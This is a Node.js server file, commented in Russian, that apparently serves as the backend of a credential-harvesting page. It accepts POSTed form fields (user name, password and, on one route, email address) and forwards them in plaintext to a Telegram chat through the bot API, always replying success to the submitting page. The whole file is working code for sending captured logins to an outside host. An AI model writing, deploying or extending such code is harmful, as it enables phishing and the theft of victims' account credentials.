/**
 * HTTP-сервис: принимает события отправки форм (main/add) и шлёт сообщение в Telegram.
 * Содержимое сообщения совпадает со структурой output/main.json и output/add.json.
 */

require('dotenv').config();
const http = require('http');
const axios = require('axios');

const PORT = process.env.BOT_PORT || 3001;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

const TELEGRAM_API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;

function formatMessage(source, data) {
  const lines = Object.entries(data).map(([key, value]) => `${key}: ${value}`);
  return `📋 Форма: ${source}\n\n` + lines.join('\n');
}

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('TELEGRAM_BOT_TOKEN или TELEGRAM_CHAT_ID не заданы — сообщение не отправлено');
    return Promise.resolve();
  }
  return axios.post(TELEGRAM_API + '/sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    disable_web_page_preview: true
  }).then(function () {
    console.log('Сообщение отправлено в Telegram');
  }).catch(function (err) {
    console.error('Ошибка отправки в Telegram:', err.response ? err.response.data : err.message);
  });
}

const server = http.createServer(function (req, res) {
  if (req.method !== 'POST') {
    res.writeHead(405, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: 'Method Not Allowed' }));
    return;
  }

  let body = '';
  req.on('data', function (chunk) { body += chunk; });
  req.on('end', function () {
    let data;
    try {
      data = body ? JSON.parse(body) : {};
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'Invalid JSON' }));
      return;
    }

    const url = req.url.split('?')[0];
    let source;
    let payload;

    if (url === '/notify/main') {
      source = 'main';
      payload = {
        userName: data.userName || '',
        password: data.password || ''
      };
    } else if (url === '/notify/add') {
      source = 'add';
      payload = {
        emailAddress: data.emailAddress || '',
        userName: data.userName || '',
        password: data.password || ''
      };
    } else {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'Not Found' }));
      return;
    }

    const text = formatMessage(source, payload);
    sendToTelegram(text).then(function () {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    }).catch(function () {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    });
  });
});

server.listen(PORT, function () {
  console.log('Bot слушает порт', PORT);
  console.log('POST /notify/main — форма main (userName, password)');
  console.log('POST /notify/add  — форма add (emailAddress, userName, password)');
});
